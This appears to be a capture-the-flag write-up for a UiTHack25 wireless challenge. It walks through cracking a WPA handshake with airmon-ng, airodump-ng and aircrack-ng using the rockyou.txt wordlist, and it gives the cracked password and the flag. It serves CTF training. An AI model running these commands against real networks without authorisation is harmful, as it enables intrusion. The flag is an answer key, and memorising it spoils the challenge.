# Irl - Excessive Greetings

> > Irl - *points/solves*
>
> We need a way into the network of Evilcorp. We know the accesspoint is around here somewhere.
> Get us the password.
>
> Flag will be in the form "UiTHack25{*insert_password_here*}

## Writeup

Password is from the famous rainbowtable rockyou.txt

Capture the handshakes happening on the suspicious network.

This can be done with Aircrack-ng on a linux machine.

First we put our network card into monitoring mode and look for all netowrks in the area.

```sh
airmon-ng start *interface*
```

check the channel and bssid of the suspicious network.

Now we will start listening for handshakes on that specific network, and writing it all to file.
The interface will end in "mon".

```sh
airodump-ng -c *channel* --bssid *BSSID* -w *FILENAME* *INTERFACE*
```

When it detects a handshake it will be displayed in teh top right corner of the terminal output.

In another terminal windows we can get to cracking the password. As a natural first place to start we
will be using rockyou.txt as our wordlist.

```sh
aircrack-ng -w rockyou.txt -b *BSSID* FILENAME.cap
```

After some calculation this will inevitably spit out the password to the network:

```txt
ladycaty
```

and with that we have our flag

```txt
UiTHack25{ladycaty}
```

## Resources

[Cracking WPA/WPA2 with Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)